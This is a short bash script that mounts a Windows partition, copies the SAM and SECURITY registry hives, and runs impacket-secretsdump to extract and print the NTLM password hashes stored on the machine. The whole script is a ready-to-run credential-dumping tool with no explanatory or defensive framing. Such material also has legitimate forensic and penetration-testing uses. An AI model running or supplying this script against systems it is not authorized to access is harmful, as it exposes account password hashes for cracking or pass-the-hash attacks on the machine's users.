configPath="Windows/System32/config"
if [ -z "$1" ]; then
part="sda3"
else
part=$1
fi
echo "dumping hashnt from $part"
sudo mkdir /mnt/$part
sudo mount -o ro /dev/$part /mnt/$part
mkdir win
sudo cp /mnt/$part/$configPath/SAM ./win/SAM
sudo cp /mnt/$part/$configPath/SECURITY ./win/SECURITY
sudo umount /dev/$part
sudo apt-get install impacket-secretsdump -y > /dev/null
sudo impacket-secretsdump -sam ./win/SAM -security ./win/SECURITY LOCAL -just-dc-ntlm > ./win/hashnt
cat ./win/hashnt
